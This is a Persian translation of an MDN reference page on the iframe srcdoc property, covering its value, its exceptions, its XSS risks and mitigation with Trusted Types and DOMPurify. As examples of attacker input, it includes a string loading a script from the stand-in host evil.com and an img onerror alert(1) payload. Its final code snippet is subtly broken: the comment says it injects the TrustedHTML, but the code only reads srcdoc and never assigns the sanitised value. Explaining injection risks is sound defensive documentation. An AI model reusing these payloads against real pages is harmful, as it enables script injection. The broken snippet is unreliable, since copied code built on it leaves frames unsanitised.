---
title: "HTMLIFrameElement: srcdoc property"
short-title: srcdoc
slug: Web/API/HTMLIFrameElement/srcdoc
page-type: web-api-instance-property
browser-compat: api.HTMLIFrameElement.srcdoc
---

{{APIRef("HTML DOM")}}

> [!WARNING]
> این ویژگی ورودی خود را به صورت HTML تجزیه می‌کند و نتیجه را در DOM فریم می‌نویسد.
> API‌هایی از این دست به عنوان [حوضچه‌های تزریق](/en-US/docs/Web/API/Trusted_Types_API#concepts_and_usage) شناخته می‌شوند و در صورتی که ورودی از سوی یک مهاجم باشد، به طور بالقوه یک بردار برای حملات [اسکریپت‌نویسی بین‌سایتی (XSS)](/en-US/docs/Web/Security/Attacks/XSS) هستند.
>
> می‌توانید این خطر را با اختصاص دادن همیشگی اشیاء `TrustedHTML` به جای رشته‌ها و [اجباری کردن انواع قابل اعتماد](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) کاهش دهید.
> برای اطلاعات بیشتر به [ملاحظات امنیتی](#security_considerations) مراجعه کنید.

خاصیت **`srcdoc`** از رابط {{domxref("HTMLIFrameElement")}}، نشانه‌گذاری HTML درون‌خطی سند فریم را دریافت یا تنظیم می‌کند.

این ویژگی منعکس‌کنندهٔ صفت [`srcdoc`](/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) عنصر {{htmlelement("iframe")}} است.

## مقدار

دریافت این خاصیت یک رشته شامل سریال‌سازی HTML سند فریم را برمی‌گرداند. اگر مقدار تنظیم نشده باشد، `undefined` است.

تنظیم این خاصیت یک شیء {{domxref("TrustedHTML")}} یا یک رشته را می‌پذیرد. این ورودی را به عنوان یک سند HTML تجزیه کرده و محتوای فریم را با نتیجه جایگزین می‌کند.

### استثناها

- `TypeError`
  - : زمانی پرتاب می‌شود که خاصیت به یک رشته تنظیم شود در حالی که [Trusted Types](/en-US/docs/Web/API/Trusted_Types_API) توسط یک [CSP] enforce شده‌اند و هیچ خط مشی پیش‌فرضی تعریف نشده باشد.

## توضیحات

خاصیت **`srcdoc`** محتوای صفت [`srcdoc`](/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) عنصر `<iframe>` را منعکس می‌کند و می‌توان از آن برای تنظیم یا دریافت سند HTML متعلق به {{htmlelement("iframe")}} استفاده کرد.

هنگام تنظیم این خاصیت، ورودی باید یک سند HTML معتبر شامل {{glossary("doctype","دستور doctype")}}، {{htmlelement("html")}}، {{htmlelement("body")}} و سایر برچسب‌ها را تعریف کند. با این حال توجه داشته باشید که مرورگرها معمولاً نسبت به نشانه‌گذاری نامعتبر تحمل دارند و اکثر آن‌ها سعی می‌کنند ورودی‌ای که فقط شامل محتوای بدنه است را رندر کنند.

هر نشانه‌گذاری که توسط مرورگر پشتیبانی می‌شود، از جمله {{glossary("shadow tree", "ریشه‌های سایه")}}، تجزیه/سریال‌سازی خواهد شد.

توجه داشته باشید که اگر این ویژگی تنظیم شود، هر مقداری که در خاصیت {{domxref("HTMLIFrameElement.src", "src")}} تنظیم شده باشد را نادیده می‌گیرد.

### ملاحظات امنیتی

خاصیت `srcdoc` به طور پیش‌فرض اجازه می‌دهد هر نشانه‌گذاری HTML در یک فریم اجرا شود. اگر فریم با استفاده از دستور [`sandbox`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) سیاست امنیت محتوا (CSP) محصور نشده باشد (یا محصور شده باشد اما شامل مقدار [`allow-same-origin`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) باشد)، آنگاه با والد خود هم‌مبدأ خواهد بود. این بدان معناست که فریم به طور کامل به DOM و منابع والد دسترسی خواهد داشت و بالعکس.

این یک بردار قابل توجه برای حملات [اسکریپت‌نویسی بین‌سایتی (XSS)](/en-US/docs/Web/Security/Attacks/XSS) است اگر رشته‌های بالقوه ناایمن ارائه‌شده توسط کاربر بدون پالایش قبلی به یک فریم تزریق شوند. کد زیر را در نظر بگیرید که در آن یک رشته HTML از یک کاربر ممکن است به یک فریم منتقل شود و سپس به سند اضافه شود.

```js
const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
const iframe = document.createElement("iframe");
iframe.srcdoc = untrustedStringFromUser;
document.body.appendChild(iframe);
```

اگر انتظار نمی‌رود که فریم به سند والد شما نیاز داشته باشد، می‌توانید با استفاده از محصورسازی CSP بدون مقدار `allow-same-origin` خطر را کاهش دهید. سپس فریم به عنوان یک منبع متقاطع-مبدأ در نظر گرفته می‌شود و حملات به طور قابل توجهی محدود می‌شوند. همچنین می‌توانید از یک CSP عمومی‌تر برای محدود کردن مکان‌هایی که اسکریپت‌ها و سایر منابع مجاز به دریافت از آن‌ها هستند استفاده کنید.

می‌توانید با اختصاص دادن همیشگی اشیاء {{domxref("TrustedHTML")}} به جای رشته‌ها و [اجبار نوع قابل اعتماد](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) با استفاده از دستور [`require-trusted-types-for`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for) CSP، خطر را بیشتر کاهش دهید. این تضمین می‌کند که ورودی از یک تابع تبدیل عبور کند، که فرصت [پالایش](/en-US/docs/Web/Security/Attacks/XSS#sanitization) ورودی برای حذف نشانه‌گذاری بالقوه خطرناک قبل از تزریق را دارد.

## مثال‌ها

### خواندن HTML از یک iframe

خواندن `srcdoc` باعث می‌شود عامل کاربر سند iframe را سریال‌سازی کند.

با توجه به HTML زیر:

```html
<iframe
  id="example"
  srcdoc="<!doctype html><body><p>Hello World!</p></body>"></iframe>
```

می‌توانید نشانه‌گذاری را به صورت زیر دریافت و ثبت کنید:

```js
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
console.log(frameDoc); // "<!doctype html><body><p>Hello World!</p></body>"
```

### جایگزینی منبع درون‌خطی فریم

در این مثال، سند یک فریم را با اختصاص HTML به خاصیت `srcdoc` آن جایگزین می‌کنیم. برای کاهش خطر XSS، ابتدا یک شیء `TrustedHTML` از رشته حاوی HTML ایجاد می‌کنیم و سپس آن شیء را به `srcdoc` اختصاص می‌دهیم.

انواع قابل اعتماد هنوز در همه مرورگرها پشتیبانی نمی‌شوند، بنابراین ابتدا [tinyfill انواع قابل اعتماد](/en-US/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill) را تعریف می‌کنیم. این به عنوان یک جایگزین شفاف برای API JavaScript Trusted Types عمل می‌کند:

```js
if (typeof trustedTypes === "undefined")
  trustedTypes = { createPolicy: (n, rules) => rules };
```

سپس یک {{domxref("TrustedTypePolicy")}} ایجاد می‌کنیم که یک {{domxref("TrustedTypePolicy/createHTML", "createHTML()")}} را برای تبدیل یک رشته ورودی به نمونه‌های {{domxref("TrustedHTML")}} تعریف می‌کند. معمولاً پیاده‌سازی‌های `createHTML()` از کتابخانه‌ای مانند [DOMPurify](https://github.com/cure53/DOMPurify) برای پالایش ورودی استفاده می‌کنند، همانطور که در زیر نشان داده شده است:

```js
const policy = trustedTypes.createPolicy("my-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
```

سپس از این شیء `policy` برای ایجاد یک شیء `TrustedHTML` از رشته ورودی بالقوه ناایمن استفاده می‌کنیم و نتیجه را به عنصر اختصاص می‌دهیم:

```js
// The potentially malicious string
const untrustedString =
  "<!doctype html><body><p>I might be XSS</p><img src='x' onerror='alert(1)'></body>";

// Create a TrustedHTML instance using the policy
const trustedHTML = policy.createHTML(untrustedString);

// Inject the TrustedHTML (which contains a trusted string)
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
```

> [!WARNING]
> اگرچه می‌توانید مستقیماً یک رشته به `srcdoc` اختصاص دهید، این یک [خطر امنیتی](#security_considerations) است اگر رشته‌ای که قرار است درج شود ممکن است حاوی محتوای بالقوه مخرب باشد.
> باید از `TrustedHTML` استفاده کنید تا اطمینان حاصل شود که محتوا قبل از درج پالایش شده است، و همچنین باید یک هدر CSP برای [اجباری کردن انواع قابل اعتماد](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) تنظیم کنید.

## مشخصات

{{Specifications}}

## سازگاری با مرورگرها

{{Compat}}